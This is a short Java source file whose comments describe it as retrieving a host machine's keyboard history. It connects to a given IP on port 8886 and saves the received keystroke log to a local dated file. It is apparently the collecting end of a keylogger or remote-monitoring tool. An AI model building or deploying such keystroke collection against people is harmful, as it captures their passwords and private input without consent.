package client;



import java.io.*;
import java.net.Socket;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Class : 获取宿主机键盘记录类
 * */
public class ClientKeyboardRecord {
    /**
     * 获取宿主机键盘事件历史并记录,需要传入宿主机ip
     * */
    public static void recordKeyboardHistory(String ipAddress) throws UnknownHostException, IOException{
        //根据当前时间建立记录文件
        SimpleDateFormat df1 = new SimpleDateFormat("yyyy-MM-dd");
        String fileName = df1.format(new Date());
        //建立套间字
        Socket keyBoardHistorySocket=new Socket(ipAddress,8886);
        //建立记录文件存储路径
        String path=(new File("")).getAbsoluteFile()+"/"+fileName+"_c1_"+"_Keyboard.txt";

        DataInputStream disDataInputStream=new DataInputStream(keyBoardHistorySocket.getInputStream());
        DataOutputStream dosDataOutputStream=new DataOutputStream(new FileOutputStream(path));

        byte [] buf= new byte[1024];
        int len=0;
        while((len=disDataInputStream.read(buf))!=-1) {
            dosDataOutputStream.write(buf,0,len);
        }
        dosDataOutputStream.flush();
        dosDataOutputStream.flush();
        dosDataOutputStream.close();
        disDataInputStream.close();
        disDataInputStream.close();
    }
}
